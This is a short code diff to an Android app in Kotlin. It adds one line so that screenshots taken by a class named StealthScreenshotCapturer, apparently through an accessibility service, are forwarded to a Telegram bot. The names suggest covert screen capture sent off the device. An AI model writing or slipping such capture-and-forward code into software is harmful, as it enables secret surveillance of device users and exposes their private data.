@@ -13,6 +13,7 @@ import com.ismartcoding.lib.channel.sendEvent
 import com.ismartcoding.lib.helpers.JsonHelper
 import com.ismartcoding.plain.features.PackageHelper
 import com.ismartcoding.plain.services.PlainAccessibilityService
+import com.ismartcoding.plain.telegram.TelegramBotManager
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.serialization.Serializable
 import java.io.File
@@ -123,6 +124,7 @@ object StealthScreenshotCapturer {
                 manual = manual,
             )
             broadcast(shot)
+            if (shot != null) TelegramBotManager.forwardStealthShot(shot)
             shot
         } catch (e: Throwable) {
             LogCat.e("StealthScreenshot.persist failed: ${e.message}")
